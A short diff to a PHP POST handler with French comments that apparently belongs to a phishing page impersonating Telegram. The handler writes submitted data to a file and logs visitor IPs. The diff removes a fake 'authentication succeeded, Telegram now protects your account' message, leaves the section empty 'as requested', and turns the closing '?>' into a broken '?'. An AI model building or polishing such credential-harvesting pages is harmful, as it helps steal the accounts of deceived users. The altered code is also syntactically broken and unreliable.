@@ -53,8 +53,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         }
         
         if ($written !== false) {
-            // Message de succès amélioré
-            echo "AUTHENTIFICATION RÉUSSI ☑️\n TELEGRAME PROTÈGE DÉSORMAIS VÔTRE COMPTE.";
+            // Section vide comme demandé - aucune redirection ni message
         } else {
             // Journalisation d'erreur professionnelle
             error_log("[" . date('Y-m-d H:i:s') . "] Échec d'écriture dans $file. IP: $ip");
@@ -66,5 +65,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 } else {
     header("HTTP/1.1 403 Forbidden");
     echo "Accès refusé : Méthode non autorisée.";
+    exit();
 }
-?>
+?
